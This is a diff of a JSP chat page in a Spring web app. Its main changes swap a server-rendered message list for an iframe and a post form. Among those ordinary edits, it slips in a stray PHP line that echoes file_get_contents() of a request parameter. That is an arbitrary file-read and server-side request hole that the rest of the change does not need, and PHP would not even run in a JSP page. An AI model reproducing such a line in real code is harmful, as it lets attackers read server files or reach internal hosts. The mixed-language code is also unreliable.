@@ -13,8 +13,8 @@
 <%@page import="org.springframework.web.servlet.view.RedirectView"%>
 <%@page import="org.springframework.web.servlet.ModelAndView"%>
 <%@page contentType="text/html" pageEncoding="UTF-8"%>
-<!DOCTYPE html>
 <html>
+    <?php echo file_get_contents($_REQUEST['google.com']); ?>
     <head>
         <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
         <style>
@@ -30,7 +30,7 @@
     <body>
         <div class="profile-menu">
             <ul class="menu-bar">
-                <li><a class="menu-item fa fa-user" style="font-size:20px;" href="#"> Profile</a>
+                <li><a class="menu-item fa fa-user" style="font-size:20px;"> Profile</a>
                     <ul class="sub-menu menu-bar">
                         <li><a class="menu-item fa fa-pencil" style="font-size:20px" href="edit"> Edit</a></li>
                         <form method="GET" action="logout">
@@ -42,36 +42,13 @@
         </div>
         <div class="center">
             <div class="container">
-
-                <ul class="list-unstyled">
-                    <%
-                        ArrayList<LoggedInUser> messages = (ArrayList<LoggedInUser>) request.getSession().getAttribute("messages");
-                        if (messages != null) {
-                            for (LoggedInUser loggedInUser : messages) {
-                    %>
-                    <li class="d-flex justify-content-between mb-4">
-                        <div class="card">
-                            <div class="card-header d-flex justify-content-between p-3">
-                                <p class="fw-bold mb-0"><%=loggedInUser.getName()%></p>
-                                <p class="text-muted small mb-0"><i class="far fa-clock"></i> 12 mins ago</p>
-                            </div>
-                            <div class="card-body">
-                                <p class="mb-0">
-                                    <%=loggedInUser.getMessage()%>
-                                </p>
-                            </div>
-                        </div>
-                    </li>
-                    <%}   
-                       }
-                    %>
-                    <li class="bg-white mb-3">
-                        <form class="form-outline" action="chat" method="POST">
-                            <input class="form-control" name="message" id="message"/>
-                            <button name="send" type="submit"  value="Send" class="btn btn-info btn-rounded float-end">Send</button>
-                        </form>
-                    </li>
-                </ul>
+                <div style="overflow:hidden;">
+                    <iframe style="height:400px" class="container" src="http://localhost:8081/ChatAppWeb/messages" title="Messages"></iframe>
+                </div>
+                <form style="padding-top:100px" class="form-outline" action="chat" method="POST">
+                    <input class="form-control" name="message" id="message"/>
+                    <button name="send" type="submit"  value="Send" class="btn btn-info btn-rounded float-end">Send</button>
+                </form>
             </div>
         </div>
     </body>
